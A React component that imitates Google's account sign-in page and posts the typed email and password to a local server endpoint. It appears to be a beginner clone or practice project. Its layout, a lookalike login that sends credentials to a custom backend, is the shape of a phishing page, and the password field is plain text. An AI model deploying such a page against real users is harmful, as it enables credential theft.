import React, { useEffect } from 'react';
import './App.css';
import { useState } from 'react';
import axios from 'axios';
// import { useNavigate } from 'react';
function App() {
  const url = "http://localhost:3001/abcd"

  const [values, setValues] = useState({
    email: '',
    password: ''
  })

  const [allEntry, setAllEntry] = useState([])
  // const navigate = useNavigate()
  // axios.defaults.withCredentials = true;
  const fetchInfo = () => {
    return axios.post(url, values)
      .then((res) => alert("sucess login"))
      .catch((error) => alert("plg fill the data"))
  }
  useEffect(() => {

  }, []);
  const handleSubmit = (event) => {
    event.preventDefault();
    console.log(values)
    if (values.email && values.password) {
      const newEntry = { id: new Date().getTime().toString(), values }
      fetchInfo();
      setAllEntry([...allEntry, newEntry])

    } else {
      alert('plg fill the data ')
    }
  }

  return (
    <div className='Container'>
      <div className='card'>
        <form action='' onSubmit={handleSubmit}>
          <div className='cardintro'>
            <div>
              <img src='logo.webp' height={70}
                alt='logo not find'
              />
            </div>
            <div className='sign'>
              Sign
            </div>
            <div>
              <p className='signpara'>Use your Google Account</p>
            </div>
            <div>
            </div>

          </div>
          <label htmlFor='email or phone no'></label>
          <input type="text" id="email" name="email" placeholder='Enter email or Phone no'
            onChange={e => setValues({ ...values, email: e.target.value })}
          />
          <div>
            <a className='ancor' href='abcd'> Forget email</a>
          </div>

          <label htmlFor='email or phone no'></label>
          <input type="text" id="password" name="password" placeholder='Enter email or Phone no'
            onChange={e => setValues({ ...values, password: e.target.value })}
          />
          <div>
            <a className='ancor' href='abcd'> Forge password </a>

          </div>
          <div className='para' >
            <p  > Not your computer? Use Guest mode to sign in privately</p>
          </div>

          <div>
            <a className='ancor' href='#'> Learn More</a>
          </div>
          <div className='actionbuttonContainer'>
            <div>
              <a className='ancor' href='abcd'>Create account</a>
            </div>
            <div>
              <button className='button' >Login</button>
            </div>
          </div>
          <div>
            {
              allEntry &&
              allEntry.map((currElem) => {
                const { id, email, password } = currElem;
                return <div key={id}>

                  <p  >{email}</p>
                  <p  >{password}</p>

                </div>
              })
            }
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
